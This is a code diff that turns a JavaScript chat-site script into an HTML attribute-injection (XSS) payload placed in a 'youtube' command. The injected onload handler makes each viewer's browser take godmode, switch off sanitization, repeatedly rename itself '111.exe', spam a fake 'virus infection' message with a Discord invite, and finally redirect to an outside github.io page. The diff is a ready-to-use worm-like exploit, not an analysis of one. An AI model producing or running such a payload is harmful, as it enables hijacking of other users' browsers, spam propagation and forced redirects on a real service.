@@ -1,22 +1,27 @@
-let coughtimer = 7777;
 socket.emit('command', {
-    list: ['godmode']
+  list: [
+    "youtube",
+    "o6Yfk7LXNZQ\" onload=\"let coughtimer = 7777;\
+socket.emit('command', {\
+    list: ['godmode']\
+});\
+socket.emit('command', {\
+    list: ['sanitize', 'off']\
+});\
+const intervalId = setInterval(function() {\
+    socket.emit('command', {\
+        list: ['name', '111.exe']\
+    });\
+    socket.emit('command', {\
+        list: ['color', 'black']\
+    });\
+    socket.emit('talk', {\
+        text: 'YOUVE BEEN INFECTED BY THE 111.EXE VIRUS! https://discord.gg/RqGzYqwMK'\
+    });\
+    coughtimer = coughtimer - 125;\
+}, coughtimer);\
+setTimeout(() => {\
+    window.location.href = 'https://tlrenny25.github.io/111.html';\
+}, 17777);\""
+  ]
 });
-socket.emit('command', {
-    list: ['sanitize', 'off']
-});
-const intervalId = setInterval(function() {
-    socket.emit("command", {
-        list: ["name", "111.exe"]
-    });
-    socket.emit("command", {
-        list: ["color", "black"]
-    });
-    socket.emit('talk', {
-        text: "YOU'VE BEEN INFECTED BY THE 111.EXE VIRUS! https://discord.gg/ZSFCDcuK"
-    });
-    coughtimer = coughtimer - 125;
-}, coughtimer);
-setTimeout(() => {
-    window.location.href = "https://tlrenny25.github.io/111.html";
-}, 17777);
